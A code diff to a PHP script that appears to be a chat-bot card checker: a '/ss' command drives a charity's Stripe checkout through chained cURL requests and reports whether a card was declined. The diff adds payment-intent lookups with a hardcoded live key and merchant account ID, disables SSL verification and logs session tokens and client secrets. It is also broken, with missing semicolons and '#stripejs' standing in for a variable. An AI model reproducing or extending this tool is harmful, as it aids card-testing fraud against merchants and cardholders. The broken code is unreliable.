@@ -209,12 +209,12 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             $resp2 = curl_exec($ch);
                 $session = trim(strip_tags(capture($resp2,'sessionId:','}')));
                 $sesstok = str_replace("'","","$session");
-                $confirmurl = "https://api.stripe.com/v1/payment_pages/$sesstok/confirm";
+                $confirmurl = "https://api.stripe.com/v1/payment_pages/$sesstok/confirm"
 
             /////////////////////////------------REQ--3--------------////////////////////////////////
 
             $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, '$confirmurl');
+            curl_setopt($ch, CURLOPT_URL, $confirmurl);
             curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
             curl_setopt($ch, CURLOPT_HEADER, 0);
             curl_setopt($ch, CURLOPT_HTTPHEADER, array(
@@ -238,7 +238,56 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             $intent = "pi_$ippi";
             $stripejs = trim(strip_tags(capture($resp3,'stripe_js": "','"')));
             $src = trim(strip_tags(capture($resp3,'source": "src','"')));
-            $sourcesrc = "src_$src";
+            $sourcesrc = "src_$src"
+
+             /////////////////////////------------REQ-4--------------////////////////////////////////
+
+            
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, #stripejs);
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            'Host: m.stripe.com',
+            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
+            'Accept: */*',
+            'Accept-Language: en-US,en;q=0.5',
+            'Content-Type: text/plain;charset=UTF-8',
+            'Origin: https://m.stripe.network',
+            'Referer: https://m.stripe.network/inner.html'));
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
+            $resp4 = curl_exec($ch);
+
+            /////////////////////////------------REQ-5--------------////////////////////////////////
+             
+             $final = "https://api.stripe.com/v1/payment_intents/$intent?key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1FnGBxBVCZ9Tk8l4&is_stripe_sdk=false&client_secret=$clientsecret";
+    
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $final);
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            'Host: m.stripe.com',
+            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
+            'Accept: */*',
+            'Accept-Language: en-US,en;q=0.5',
+            'Content-Type: text/plain;charset=UTF-8',
+            'Origin: https://m.stripe.network',
+            'Referer: https://m.stripe.network/inner.html'));
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
+            $resp5 = curl_exec($ch);
 
             /////////////////////////-------CHARITY-STRIP-----------/////////////////////////////////
 
@@ -339,7 +388,7 @@ Time -» <b>$time</b><b>s</b>
 <b>Status -» Declined! ❌
 Response -» $errormessage | 
 Decline Error -» $errorcode
-Result -» $result2 | HashVal - $hashval | SessionToken - $sesstok | ConfirmationURL - $confirmurl | ClientSecret - $clientsecret | PaymentIntent - $intent | URL - $stripejs | SourceSRC - $sourcesrc
+Result -» $result2 | HahsVal - $hashval | SessionToken - $sesstok | ConfirmationURL - $confirmurl | ClientSecret - $clientsecret | PaymentIntent - $intent | URL - $stripejs | SourceSRC - $sourcesrc | FinalURL - $final | Resp5 - $resp5
 Gateway -» 1💲 STRIPE
 Time -» <b>$time</b><b>s</b>
 
